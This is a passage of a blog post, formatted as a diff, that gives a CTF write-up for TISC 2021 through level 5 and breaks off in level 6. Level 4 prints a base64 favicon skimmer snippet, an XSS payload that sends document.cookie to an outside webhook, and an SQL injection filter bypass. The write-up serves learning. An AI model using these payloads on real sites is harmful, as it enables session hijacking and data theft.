@@ -1,0 +1,1655 @@
+---
+layout: post
+title:  "TISC 2021 Writeup"
+date:   2021-12-11 12:17:03 +0800
+categories: ctf writeup tisc-2021
+---
+
+TISC 2021 was a CTF organised by CSIT that ran from 29 Oct to 14 Nov 2021. Participants would progress (mostly) linearly through a series of increasingly harrowing cybersecurity challenges to fight for a share of the prize pool - $30,000.
+
+Having read pretty much every TISC 2020 writeup I could find in the days leading up to the start of the competition, I was inspired and figured I'd do the same ~~so that everyone can judge my rookie mistakes~~, just in case anyone wanted to read about my experience.
+
+You can also find my original writeup in all its ugliness [here](https://www.csit.gov.sg/docs/default-source/tisc-2021-write-ups/yk-write-ups.pdf?sfvrsn=ae8f64ee_2) (assuming CSIT is still hosting it). It's quite informal (I wasn't expecting them to actually publish it...); you have been warned.
+
+For this webpage, I removed some parts I deemed somewhat irrelevant or unclear, went into greater detail about certain things I feel like I didn't explain properly (mainly level 8), and *actually included my scripts* this time. Some scripts or outputs may not match their original images exactly because I got rid of the debug statements, useless functions, and generally did some cleanup.
+
+Most of the command output was transcribed manually because I originally took screenshots instead of saving the raw text; any inaccuracies are probably typos made by me while copying them over by hand.
+
+TODO: add an index here
+
+## Prelude
+
+TISC 2021 is actually the first* CTF I've participated in as a contestant. (*Note: I had previously spent 5 hours beta-testing a CTF and didn't get too far in it. It's up to you if you wish to include that one.)
+
+I'm typically quite resistant to signing up for CTFs. In fact, I'd passed up multiple opportunities in the past (multiple years' CDDCs, for instance) out of fear that I simply didn't know enough to not make a fool out of myself and wind up with a lackluster result. But having recently solved a few CTF-style challenges as part of an assignment for school (and having somewhat of a step up on those because I'd previously picked up some basic reverse engineering skills from an internship with CSIT in 2020), I gained some interest in the format and wanted to use this momentum to force myself to (hopefully) pick up some new skills before my interest fizzled out again.
+
+I had no idea what I had gotten myself into, and no sense for how well I could realistically expect myself to perform. Judging from the previous year's writeups, I'd probably get horribly destroyed, but at least I'd have walked away with a few new tricks up my sleeve and a fair bit more experience. I mean, I was prepared to be disappointed, but what's the worst that could happen?
+
+***
+
+## 0. Welcome to TISC 2021!
+
+![level 0 flavourtext](/assets/tisc-2021/desc_0.png)
+
+This is, obviously, not a real level. But I'll leave it here for completeness' sake, just in case you wanted to read the flavour text.
+
+**Flag (0 points):** `TISC{Br1ng_0n_th3_ch4ll3ng3s!!}`
+
+***
+
+## 1. Scratching the Surface
+
+Level 1 was split into two categories. Scenario 1 was a somewhat random collection of warm-up challenges, while scenario 2 involved some basic Windows forensics. Scenario 2's challenges were only unlocked once all 3 of scenario 1's challenges were completed.
+
+### Scenario 1
+
+![level 1 scenario 1](/assets/tisc-2021/desc_1x.png)
+
+**Flag (0 points):** `TISC{Yes, I am up to the challenge!}`
+
+***
+<br>
+
+![level 1-1 flavourtext](/assets/tisc-2021/desc_1a.png)
+
+After downloading `file1.wav`, I opened the file and was immediately blasted with the opening to the [theme song from The Price is Right](https://www.youtube.com/watch?v=13tnjh3dZw4). It only seemed to be playing in the left ear though, so I loaded it up in Audacity to look at the waveform.
+
+As it turns out, Morse code was playing in the other ear:
+
+![1-1 explanation 1](/assets/tisc-2021/1a_1.png "the_flag_is_right.wav")
+
+Then I used a [Morse Code decoder](https://morsedecoder.com/) to recover the flag.
+
+**Flag (10 points):** `TISC{csitislocatedinsciencepark}`
+
+***
+<br>
+
+![level 1-2 flavourtext](/assets/tisc-2021/desc_1b.png)
+
+This was obviously an EXIF-related challenge, but neither Windows' properties window nor the native photo viewer displayed the modify time down to the seconds. So I fed `file2.jpg` to this [online EXIF metadata viewer](http://exif.regex.info/exif.cgi), which spat out the answer.
+
+**Flag (10 points):** `TISC{2003:08:25 14:55:27}`
+
+***
+<br>
+
+![level 1-3 flavourtext](/assets/tisc-2021/desc_1c.png)
+
+Another image file; no hints in the EXIF metadata this time, though. Instead, I fired up my Ubuntu VM and ran `strings` on `file3.jpg`:
+
+```console
+amarok@ubuntu:~/tisc$ strings file3.jpg 
+JFIF
+(lots of irrelevant lines...)
+picture_with_text.jpg
+(lots of irrelevant lines...)
+picture_with_text.jpg
+```
+
+Investigating further, I opened the image in a hex editor (I use HxD) and did a search for the string. Just before one of the occurrences, I spotted the header of a ZIP file:
+
+![1-3 explanation 1](/assets/tisc-2021/1c_1.png)
+
+So I stripped all the bytes before the magic number and opened it as an archive. The archive contained `picture_with_text.jpg`, which didn't display correctly when I tried to view it, so I opened it in HxD too:
+
+![1-3 explanation 2](/assets/tisc-2021/1c_2.png "i guess the filename was supposed to be literal")
+
+This looked like a Caesar cipher, so I fed it to an [online decoder](https://cryptii.com/pipes/caesar-cipher) and played around with the offset. It turned out to be ROT13; the output was `ANSWER TO THIS CHALLENGE IS HERE APPLECARROTPEAR`.
+
+**Flag (10 points):** `TISC{APPLECARROTPEAR}`
+
+***
+
+### Scenario 2
+
+![level 1 scenario 2](/assets/tisc-2021/desc_1y.png)
+
+After downloading the VM and having to install VirtualBox (I typically use VMWare, but the attached text file recommended importing only with VirtualBox), I made a snapshot immediately after launching, just in case.
+
+**Flag (0 points):** `TISC{Yes, I've got this.}`
+
+***
+<br>
+
+![level 1-4 flavourtext](/assets/tisc-2021/desc_1d.png)
+
+I mean... it pops up on screen the VM starts up.
+
+**Flag (10 points):** `TISC{adam}`
+
+***
+<br>
+
+![level 1-5 flavourtext](/assets/tisc-2021/desc_1e.png)
+
+I headed to the Event Viewer because I figured any past login events would be logged in there. Obviously, I didn't want the most recent login (since that would be whenever I launched the VM), so I filtered for login events (event ID = 4624) and just went backwards down the list chronologically.
+
+![1-5 explanation 1](/assets/tisc-2021/1e_1.png "i can't believe i was foiled by timezones")
+
+(I just realised while writing this that the screenshot I took for this part doesn't quite match the explanation above. After getting stuck due to a silly mistake (as I will mention below), I started filtering for related logs, and this image was probably from one of those attempts. The time of the logon event is correct, though.)
+
+At this point, I naively submitted `TISC{17/06/2021 10:41:37}` as the flag. This got rejected. Then, because I'm not exactly the brightest bulb around, I re-submitted the same flag about 4 times, just to make sure. Then I tried a few other nearby timestamps. Naturally, all of them didn't work, and I was very confused.
+
+After puzzling over this for about 45 minutes, I realised that I had forgotten to convert the timestamp into UTC. Oops.
+
+**Flag (10 points):** `TISC{17/06/2021 02:41:37}`
+
+***
+<br>
+
+![level 1-6 flavourtext](/assets/tisc-2021/desc_1f.png)
+
+I was expecting to have to use undelete software for this one, so it was kind of melodramatic to find the file sitting in the Recycle Bin. 7-Zip even calculates the CRC32 for you.
+
+![1-6 explanation 1](/assets/tisc-2021/1f_1.png)
+
+**Flag (10 points):** `TISC{040E23DA}`
+
+***
+<br>
+
+![level 1-7 flavourtext](/assets/tisc-2021/desc_1g.png)
+
+A quick google provided me with the right command to run to get the relevant info. Then I looked up the format of the SID.
+
+![1-7 explanation 1](/assets/tisc-2021/1g_1.png)
+
+**Flag (10 points):** `TISC{1-Guest-DefaultAccount}`
+
+***
+<br>
+
+![level 1-8 flavourtext](/assets/tisc-2021/desc_1h.png)
+
+I tried the obvious route of simply viewing the browsing history in Edge, but that didn't tell me how many times each page was visited. Furthermore, strangely enough, the browsing history mysteriously deletes itself a few seconds after I view it... luckily, I made a snapshot earlier.
+
+I found out that Edge's browsing history is stored as an SQLite database in `AppData\Local\Microsoft\Edge\User Data\Default\History` (the file has no extension). Then I loaded it into an [online SQLite database viewer](https://inloop.github.io/sqlite-viewer/) to retrieve the information within.
+
+![1-8 explanation 1](/assets/tisc-2021/1h_1.png "the one reason for edge's existence")
+
+**Flag (10 points):** `TISC{2-0-0}`
+
+***
+<br>
+
+![level 1-9 flavourtext](/assets/tisc-2021/desc_1i.png)
+
+I just googled for the relevant registry key.
+
+![1-9 explanation 1](/assets/tisc-2021/1i_1.png)
+
+**Flag (10 points):** `TISC{vm-shared}`
+
+***
+<br>
+
+![level 1-10 flavourtext](/assets/tisc-2021/desc_1j.png)
+
+I found [this command snippet](https://superuser.com/a/1158540) which searches recursively for a file with a given hash and made modifications to it to suit my needs. Unfortunately, I had forgotten to silence errors, so my console was absolutely flooded with them. On the other hand, this also gave me updates on the progress of the search.
+
+Eventually, the script recursed into C:\Windows\WinSxS, which had way too many subfolders. I figured that the file in question was probably not there, so I was probably missing something important. Eventually I realised that the script would ignore hidden files and folders unless I used the `-Force` flag. This was the command I ran, in the end:
+
+![1-10 explanation 1](/assets/tisc-2021/1j_1.png)
+
+The full path refused to display, so I had to make a slight modification to it (I changed the base address so I wouldn't have to recurse through all the other directories beforehand):
+
+![1-10 explanation 2](/assets/tisc-2021/1j_2.png)
+
+`TISC{otter-singapore.lnk}` was rejected when I submitted it. So I looked in the shortcut's properties and discovered that it used to point to a no-longer-existent file `otter-singapore.jpg`.
+
+**Flag (10 points):** `TISC{otter-singapore.lnk}`
+
+***
+
+## 2. Dee Na Saw as a need
+
+Okay, warmup's over.
+
+![level 2-1 flavourtext](/assets/tisc-2021/desc_2a.png)
+![level 2-2 flavourtext](/assets/tisc-2021/desc_2b.png)
+
+`traffic.pcap` looks something like this in Wireshark:
+
+![2 explanation 1](/assets/tisc-2021/2_1.png)
+
+I noticed that each DNS query is for a domain name of the form `d33d##*******.tentopspot.net`, where `##` is a number from `01` to `64` inclusive, and `*******` was a 7-character alphanumeric string.
+
+This reeks of DNS exfiltration, so I wrote a simple Python script to dump the strings and numbers from each packet to a list:
+
+```python
+import pyshark
+
+# I re-used the same script with slight modifications for the numbers
+
+cap = pyshark.FileCapture("traffic.pcap")
+r = ""
+
+for p in cap:
+    r += p["dns"].qry_name[6:13]
+```
+
+I decided to focus on the strings first; I copied the first couple thousand characters of the output to a text file and stared at it for about half an hour. After playing around with it for a bit, I did a search for the first few characters of the string and they showed up many times. Here they are with a newline before each occurrence; it's clear that the text repeats every two "chunks":
+
+![2 explanation 2](/assets/tisc-2021/2_2.png)
+
+Unfortunately, I did not recognise the encoding being used. However, by sheer luck and some tenuous connections, I figured it out eventually. Googling about DNS exfiltration led me to [this blog post](https://awakesecurity.com/blog/dns-exfiltration-the-light-at-the-end-of-the-dns-tunnel/); in particular, figure 1 contained some partly blanked-out payload which looked a lot like what I already had. Curious, I searched up on the Canary honeypots mentioned in that article, and stumbled across [this other article](https://help.canary.tools/hc/en-gb/articles/360002425837-What-is-DNS-tunnelling-). This page mentioned base32, which turned out to be the encoding in question.
+
+I fed the string to a base32 decoder, which got me this output:
+
+```
+lorem ipsum dolor sit amet, ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz+/ maecenas volutpat condimentum egestas. pellentesque vitae porttitor turpis, sed facilisis ipsum. duis vel interdum mi, at dapibus augue. morbi vulputate ultricies vulputate. etiam a quam eu nisi euismod faucibus ac a nunc. etiam sit amet ex eu ligula gravida pulvinar eget ac urna. lorem ipsum dolor sit amet, consectetur adipiscing elit. maecenas volutpat condimentum egestas. TISC{n3vEr_0dd_0r_Ev3n} etiam a quam eu nisi euismod faucibus ac a nunc. etiam a quam eu nisi euismod faucibus ac a nunc. etiam sit amet ex eu ligula gravida pulvinar eget ac urna. lorem ipsum dolor sit amet, consectetur adipiscing elit. maecenas volutpat condimentum egestas. etiam a quam eu nisi euismod faucibus ac a nunc. etiam sit amet ex eu ligula gravida pulvinar eget ac urna. lorem ipsum dolor sit amet, consectetur adipiscing elit. maecenas volutpat condimentum egestas. maecenas volutpat condimentum egestas. maecenas volutpat condimentum egestas. 
+```
+
+**Flag 2 (50 points):** `TISC{n3vEr_0dd_0r_Ev3n}`
+
+As for the numbers, I used a similar approach. I guessed that they were supposed to correspond with base64 digits, except starting from 1 instead of 0 (since the biggest number was 64). After performing the conversion and feeding the result through a base64 decoder, I got this:
+
+![2 explanation 3](/assets/tisc-2021/2_3.png)
+
+This is, again, a ZIP file header, so I pasted the hex output into my text editor and saved it as such. The file was in fact a Word document (Word files are just zipped XML) and I tried to open it as one, but nothing particularly interesting was inside. Instead, I opened it as an archive and started going through all the XML files inside while doing a search for the flag header.
+
+Eventually, I found it buried in `word\theme\theme1.xml`.
+
+![2 explanation 4](/assets/tisc-2021/2_4.png)
+
+**Flag 1 (50 points):** `TISC{1iv3_n0t_0n_3vi1}`
+
+***
+
+## 3. Needle in a Greystack
+
+![level 3 flavourtext](/assets/tisc-2021/desc_3.png)
+
+Here's `1.bmp` and `2.bmp`, respectively:
+
+![1.bmp](/assets/tisc-2021/greystack1.bmp)
+![2.bmp](/assets/tisc-2021/greystack2.bmp)
+
+Looking at `1.bmp` in a hex editor reveals some interesting contents, but it doesn't seem to be strung together properly:
+
+![3 explanation 1](/assets/tisc-2021/3_1.png)
+
+Clearly something was hidden inside both images, but I wasn't feeling very inspired as to what to do with them. On a whim, I googled `malware grayscale` and stumbled upon a helpful image from [this article](https://dzone.com/articles/malware-detection-with-convolutional-neural-networ) about AI-based malware detection by converting binaries into grayscale images:
+
+![3 explanation 2](/assets/tisc-2021/3_2.png)
+
+Sure enough, the top left two pixels in `1.bmp` were `#4d4d4d` and `#5a5a5a` (`MZ`...?). The plaintext-like strings were broken up in the hex view earlier because the BMP file format saves pixels from the bottom to the top of the image (as well as some padding at the end of each row). I wrote a script to decode the image files:
+
+```python
+f = open("2.bmp","rb")
+g = open("2.out","wb+")
+r = []
+
+# This code was reused with minor changes for 1.bmp
+
+f.read(0x436) # discard the part we don't need
+for i in range(99):
+    l = b""
+    r = [f.read(100)[:99]] + r
+for s in r:
+    g.write(s)
+g.close()
+```
+
+`1.out` was recognised by IDA as a valid binary, while `2.out` turned out to be... whatever this is:
+
+![3 explanation 3](/assets/tisc-2021/3_3.png)
+
+Staring at the disassembly for `1.out`, I concluded that the program took a filename as an argument and... did something strange with its contents:
+
+![3 explanation 4](/assets/tisc-2021/3_4.png)
+
+After tracing the code for a bit, I made an educated guess that it was probably performing a bitwise XOR with a hardcoded byte array. `2.out` seems like the perfect candidate for this, so let's try it:
+
+```console
+amarok@ubuntu:~/tisc$ wine 1.out 2.txt
+HELLO WORLD
+Almost There!!
+```
+
+I definitely didn't remember seeing any references to `Almost There!!` in the code earlier, and a string search in IDA turned up no results. Investigating further, I found a subroutine with some interesting function calls:
+
+![3 explanation 5](/assets/tisc-2021/3_5.png)
+
+It turns out that after decoding the contents of whatever file was fed to it, the program then checks the output for the `MZ` header and, if it exists, attempts to load it as a library. I wrote another script to recover the contents of this library:
+
+```python
+one = open("1.out","rb")
+two = open("2.txt","rb")
+three = open("3.out","wb+")
+
+one.read(0x1930)
+l = 0x2649
+r = list(one.read(l))
+s = list(two.read(l))
+t = bytes((i ^ j for (i,j) in zip(r,s)))
+three.write(t)
+three.close()
+```
+
+Still searching for the source of `Almost There!!`, I searched for references to the `puts()` function, which led me to the function containing the main logic being executed. To summarise, the function was trying to read the contents of `key.txt`. If it didn't exist, it would print `Almost There!!` and exit; otherwise, it would compare the leading bytes of `key.txt` with the string `Words of the wise may open many locks in life.\0` (the null byte at the end is required) and print `*wink wink*` if the check succeeded. Regardless of whether the contents passed this check, it then... did something... with the file's contents, and printed the result.
+
+Excited, I did the first thing that came to mind:
+
+```console
+amarok@ubuntu:~/tisc$ echo -e "Words of the wise may open many locks in life.\x00" > key.txt
+amarok@ubuntu:~/tisc$ wine 1.out 2.txt
+HELLO WORLD
+*Wink wink*
+ºΘφ≡A▄▀╞φ╝aΓ£à~╖╞óç?₧hc╙k0■ε⌡æò}f)ëx
+```
+
+This definitely did not look like the flag. I was going to have to dig deeper into whatever post-processing was being done to the contents of `key.txt`, but since I was using the freeware version of IDA, I could not decompile the relevant section of code, and my attempt at static analysis didn't get me anywhere. What does this stuff even *mean*?
+
+![3 explanation 6](/assets/tisc-2021/3_6.png)
+
+Eventually, I gave up trying to understand the assembly and turned to WinDbg to find out what was actually going on. After some manual stepping-through of the code, I found that the snippet pictured above effectively permuted the byte array in a manner depending on the contents of `key.txt`. Furthermore, only the first 14 bytes of `key.txt` were being used; the fancy magic constants weird computations were probably the result of a line of code like `x = (x+1)%14`. Was I looking for a 14 character string?
+
+Obviously, the best place to look for such a string would be `2.out`, since it contained lots of random-looking words. While attempting to use regex to search for a string of 14 non-whitespace characters (`\S{14}`), I accidentally typed `\S[14]` instead, which searched for a single non-whitespace character followed by a `1` or `4`. As luck would have it, there were exactly two occurrences of `4` in the file, both within `!t4ttaRRatt4t!`. Quickly glancing at the rest of the file, I concluded that this was the only non-word in the whole file, and it was also 14 characters long... hmm...
+
+![luck 100](/assets/tisc-2021/luck.png)
+
+I put this into `key.txt` and sure enough, it worked:
+
+```console
+amarok@ubuntu:~/tisc$ wine 1.out 2.txt
+HELLO WORLD
+TISC{21232f297a57a5a743894a0e4a801fc3}
+```
+
+**Flag (100 points):** `TISC{21232f297a57a5a743894a0e4a801fc3}`
+
+Later on (during level 6), I would realise that the library code was in fact an implementation of RC4.
+
+***
+
+## 4. The Magician's Den
+
+![level 4 flavourtext](/assets/tisc-2021/desc_4a.png)
+![level 4 hint](/assets/tisc-2021/desc_4b.png)
+
+Googling about Magecart led me to [this article](https://www.darkreading.com/attacks-breaches/magecart-how-its-attack-techniques-evolved), where the section about card skimming scripts in favicons caught my eye. Unable to find any other hints in the site, I decided to give it a try:
+
+![4 explanation 1](/assets/tisc-2021/4_1.png)
+
+I found the following code in the metadata of the webpage's favicon:
+
+```javascript
+eval(base64_decode('JGNoPWN1cmxfaW5pdCgpO2N1cmxfc2V0b3B0KCRjaCxDVVJMT1BUX1VSTCwiaHR0cDovL3MwcHE2c2xmYXVud2J0bXlzZzYyeXptb2RkYXc3cHBqLmN0Zi5zZzoxODkyNi94Y3Zsb3N4Z2J0ZmNvZm92eXdieGRhd3JlZ2pienF0YS5waHAiKTtjdXJsX3NldG9wdCgkY2gsQ1VSTE9QVF9QT1NULDEpO2N1cmxfc2V0b3B0KCRjaCxDVVJMT1BUX1BPU1RGSUVMRFMsIjE0YzRiMDZiODI0ZWM1OTMyMzkzNjI1MTdmNTM4YjI5PUhpJTIwZnJvbSUyMHNjYWRhIik7JHNlcnZlcl9vdXRwdXQ9Y3VybF9leGVjKCRjaCk7'));
+```
+
+The base64 decodes to the following PHP snippet:
+
+```php
+$ch=curl_init();
+curl_setopt($ch,CURLOPT_URL,"http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/xcvlosxgbtfcofovywbxdawregjbzqta.php");
+curl_setopt($ch,CURLOPT_POST,1);
+curl_setopt($ch,CURLOPT_POSTFIELDS,"14c4b06b824ec593239362517f538b29=Hi%20from%20scada");
+$server_output=curl_exec($ch);
+```
+
+Okay, so this gives us a new page to investigate. On my first visit, it was blank except for a single line saying `Only those who knows the method is allowed.` This is a pretty blatant hint considering the code snippet contains a POST request to the site, so I imitated the format of the POST request using Burp Suite and sent it over:
+
+```http
+POST /xcvlosxgbtfcofovywbxdawregjbzqta.php HTTP/1.1
+Host: s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signedexchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+
+14c4b06b824ec593239362517f538b29=Hi%20from%20scada
+```
+
+This caused the page to return `New record displayed successfully.` Clearly, I did something, but I still had no idea what. After a handful of blind SQL injection attempts to see if I could get any errors to occur, I decided to forget about this for now and see if there's anything at the root of this new domain we were just given.
+
+![4 explanation 2](/assets/tisc-2021/4_2.png)
+
+This landing page of sorts doesn't contain anything interesting on its own, but it does link to a sub-page `data.php`. The `Last viewed by admin` timestamp seemed to update around every minute or so:
+
+![4 explanation 3](/assets/tisc-2021/4_3.png)
+
+Then, on a whim, I decided to check if `robots.txt` existed, and it did. It contained the following:
+
+```
+Disallow /*.php?debug=TRUE
+Disallow /login.php
+```
+
+This alerted me to the existence of `login.php`:
+
+![4 explanation 4](/assets/tisc-2021/4_4.png)
+
+Again, I tried some basic SQL injections, but nothing interesting happened. Then I decided to check out `register.php`. Under normal circumstances, the page just contains the single line `Due to the overwhelming request, registration is currently disabled` and absolutely nothing else. However, if we append `?debug=TRUE` to the URL, the following HTML comments show up as well:
+
+```html
+<!-- Note from admin: I temporarily disabled the registration form since it does not seems to be working if we are hardcoding them. -->
+<!-- Thinking we should switch to using database for storing the credential in the future -->
+<!-- <div>Upon sign up, the credentials are randomly generated and sent to the respective email.</div> -->
+```
+
+In other words, I should stop trying to attack the login page since there is no SQL database on the backend handling login requests anyway.
+
+One last thing - while using the element inspector in my web browser, I had noticed the presence of a cookie named `PHPSESSID`. I didn't really know what I could do with it yet, though, so let's turn our attention back to `data.php` for now.
+
+***
+
+Back at `data.php`, I clicked on each of the links in turn, but the contents of each one seemed... random. Most of the time, the page simply said `No flag!`, but later on it would instead display an SQL injection attempt, or a broken image element, or... `Hi from scada`? I inferred from this that whatever we POSTed to the server from the very first subpage I was led to would eventually end up here. More specifically, the number of pages in this list is fixed, and each time a payload is successfully POSTED to the server the oldest page gets overwritten with its contents.
+
+The default content of each page was probably `No flag!`, which explains why I saw those only initially. The SQL injection attempts and the broken image element were probably from other participants trying to post their own payloads to the server, too.
+
+First, I tried to post an inline PHP payload, but the inline PHP tags were automatically commented out. Then, I googled a bit and discovered XSS cookie stealing. Since the updating timestamps suggested that the admin (presumably a bot with the admin cookie) was accessing each page at regular intervals, I decided to try writing a payload that would send me the contents of the `PHPSESSID` cookie of anybody who viewed it:
+
+```html
+<img src="a.jpg" onerror="this.src='https://webhook.site/6981cc77-63f5-4506-8daa-2b2b5676f4a2?c='%2bdocument.cookie"></img>
+```
+
+![4 explanation 5](/assets/tisc-2021/4_5.png)
+
+After some tense waiting, the contents of the cookie popped up on my dashboard. I attemped to access `login.php` with it and was redirected to `landing_admin.php`:
+
+![4 explanation 6](/assets/tisc-2021/4_6.png)
+
+A quick inspection of outgoing requests revealed that a simple POST request was being issued:
+
+```http
+POST /landing_admin.php HTTP/1.1
+Host: s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926
+Content-Length: 14
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signedexchange;v=b3;q=0.9
+Referer: http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/landing_admin.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=ee41d669bc22bdec9995f3428e9d662e
+Connection: close
+
+filter=isALIVE
+```
+
+First, I tried everyone's favourite SQL injection, `' or 1=1-- `, but this returned `Filter can only be 7 characters long.` Further experimentation revealed that the following characters were automatically filtered out from the input before the SQL statement was evaluated (I did not do an exhaustive search, so there are probably more): `/ * | ! ^ % $ & + - = ; (space) \n \r \t`
+
+7 characters was only exactly enough space for `' or 1#`, which would work... if space wasn't filtered. Most of the "creative" substitutes I could think of for it (like `\n`) were blacklisted as well. At this point, I got stuck for a while, but luckily after a few hours I stumbled upon [this cheatsheet](https://github.com/w181496/Web-CTF-Cheatsheet); one of the lines within stated that valid MySQL whitespace characters were `0x09 0x0a 0x0b 0x0c 0x0d 0x20 0xa0`. I had not tried `0xa0` (the non-breaking space), and it turned out to work just fine:
+
+![4 explanation 7](/assets/tisc-2021/4_7.png)
+
+(Note: there had been a typo in the flag when I solved this challenge; it was rectified afterwards.)
+
+**Flag (100 points):** `TISC{H0P3_YOu_eNJ0Y-1t}`
+
+<u>Additional notes:</u> appending `?debug=TRUE` to `landing_admin.php` causes the server to spit out verbose SQL error messages whenever the injection attempt resulted in a malformed SQL statement being evaluated (instead of failing silently). This did not help much, though.
+
+***
+
+## 5. Need for Speed
+
+Zoom zoom.
+
+![level 5 flavourtext](/assets/tisc-2021/desc_5.png)
+
+The challenge areas mention "binary manipulation", but since the only file provided is `route.bmp` (shown below), there's probably some steganography involved.
+
+![route.bmp](/assets/tisc-2021/route.bmp)
+
+I searched for and tried throwing various steganography tools I found online at the image. zsteg and stegseek were of no help whatsoever, sadly. Eventually, I stumbled upon stegsolve, which allows you to view individual bit planes to check for irregularities and save them to separate files.
+
+Here are the exported images for red, green and blue planes 0 respectively:
+
+![red plane 0](/assets/tisc-2021/route_r0.bmp)
+
+![green plane 0](/assets/tisc-2021/route_g0.bmp)
+
+![blue plane 0](/assets/tisc-2021/route_b0.bmp)
+
+Clearly, this suggests some sort of LSB steganography at play. Unfortunately, stegsolve's in-built data exporter returned garbage regardless of which settings I used, so things were probably slightly more complicated than that.
+
+Eventually, I noticed that blue plane 0's noisy region somehow looked... different from the others. It was much denser with black pixels, and many of the regions seemed to angle themselves in a diagonal fashion. Here's a close up of the top-left corner which (hopefully) illustrates what I mean:
+
+![5 explanation 1](/assets/tisc-2021/5_1.png)
+
+Eventually, I noticed the following pattern (all red pixels were previously black):
+
+![5 explanation 2](/assets/tisc-2021/5_2.png)
+
+In other words, every 3rd pixel was black. Furthermore, due to the width of the picture being one more of an exact multiple of 3 (which coincidentally also applies to the cropped region I used as an example above), if we "read" the pixels from top-left to bottom-right, this pattern maintains itself even across rows.
+
+Since a byte was 8 bits, maybe each byte was being encoded into a group of 9 bits, with the last bit always being 0 to denote as a separator (as well as keep everything aligned nicely, so the MSB of the next byte would always be stored in the red plane)?
+
+Suspicious, I manually tested my hypothetical encoding format to recover a few bytes of data and obtained `37 7A BC AF 27 1C`, which is exactly the magic number of a 7-Zip archive. So I wrote a script to dump the secret content of the image:
+
+```python
+from PIL import Image
+
+def pix2bit(t):
+    return 1 if t == (255,255,255) else 0
+
+f = open("secret.7z","wb+")
+
+r = Image.open("r0.bmp").getdata()
+g = Image.open("g0.bmp").getdata()
+b = Image.open("b0.bmp").getdata()
+
+i = 0
+
+while True:
+    x = 128*pix2bit(r[i])+64*pix2bit(g[i])+32*pix2bit(b[i]) \
+        +16*pix2bit(r[i+1])+8*pix2bit(g[i+1])+4*pix2bit(b[i+1]) \
+        +2*pix2bit(r[i+2])+pix2bit(g[i+2])
+    f.write(bytes([x]))
+    if b[i+2] == (0,0,0):
+        i += 3
+    else: # No more separator after this group, this must be the last byte
+        break
+f.close()
+```
+
+The resulting archive contained two files. `update.log` was a text file containing the following note:
+
+```
+see turn signals for updated abort code :)
+- P4lindr0me
+```
+
+`candump.log` was a large text file (over 75k lines):
+
+![5 explanation 3](/assets/tisc-2021/5_3.png)
+
+Some googling revealed that this was a dump of Controller Area Network bus traffic; the CAN protocol seems to be used in stuff like cars. Each line has the format:
+
+```
+(timestamp) vcan0 (arbitration id)#(message data)
+```
+
+This means that (message data) was sent with the specified arbitration ID; only components specifically listening for that ID will receive the message.
+
+Initially, I tried pairing ICSim (which simulates a car's dashboard) with can-utils to replay the candump file, but nothing happened; presumably, this is because none of the arbitration IDs matched what ICSim was expecting (there is no standard for which ID is to be used for each component).
+
+Then, I stared at `candump.log` manually and noticed that the messages assigned to each arbitration ID seemed to repeat, or were drawn from an extremely limited pool of possibilities. So I wrote a python script to group all messages with the same arbitrartion ID together to look for patterns:
+
+```python
+import re
+
+d = {}
+
+f = open("candump.log","r")
+g = open("processed.log","w+")
+
+for line in f:
+    s = re.sub("(.+) (.+) (.+)\#(.+)","\\1\t\\3\t\\4",line)
+    q = s.split("\t")
+    if q[1] not in d:
+        d[q[1]] = [s]
+    else:
+        d[q[1]] += [s]
+
+for e in d:
+    for x in d[e]:
+        g.write(x)
+    g.write("\n\n\n")
+g.close()
+```
+
+Then I decided to see if I could take the lazy way out, so I scrolled through the output looking for anything suspicious. I must have gotten lucky because eventually something caught my eye as I was rapidly tapping PageDown:
+
+![5 explanation 4](/assets/tisc-2021/5_4.png)
+
+Out of nowhere, _small letters_ started popping up in the message data being sent. This was very weird, because wasn't `candump.log` supposed to be generated by a program? Why would a program do that? Even more interestingly, these small letters showed up only in messages assigned to arbitration ID `0C7`, and they all appeared exclusively in the 3rd byte of the message.
+
+These bytes also looked a lot like ASCII characters...
+
+So I read the 3rd byte of every message with ID `0C7` and converted them all to ASCII. This returned the string `l1f3_15_wh47_h4pp3n5_wh3n_y0u'r3_bu5y_m4k1n6_07h3r_pl4n5.-j_0_h_n_l_3_n_n_0_n`, which does indeed have the MD5 hash given in the challenge description.
+
+**Flag (100 points):** `TISC{l1f3_15_wh47_h4pp3n5_wh3n_y0u'r3_bu5y_m4k1n6_07h3r_pl4n5.-j_0_h_n_l_3_n_n_0_n}`
+
+***
+
+## 6. Knock Knock, Who's There?
+
+![level 6 flavourtext](/assets/tisc-2021/desc_6.png)
+
+Attempting to connect to the given IP address gives no response. Nmap also revealed no open ports, even with an exhaustive scan (which took about 2 hours). The challenge name hints strongly of port knocking, so I guess we'll have to look through the capture file for signs of those... somehow. Except, the capture file is 614 MB in size.
+
+**614 MB**.
+
+![6 explanation 1](/assets/tisc-2021/6_1.png "wireshark hell")
+
+Trying to perform any operation (loading the file, applying a packet filter, etc) took about slightly over a minute each time. It was not fun.
+
+To add to the whole "needle in a haystack" experience, most of the packets themselves contained information which, under other circumstances, would be quite interesting, but merely served as red herrings here. These included:
+- Back-and-forth ICMP pings (initially, I thought this suggested ICMP port knocking... turns out, it wasn't)
+- Nmap port scans (which contributed several swathes of 20000+ TCP SYN or RST/ACK packets each)
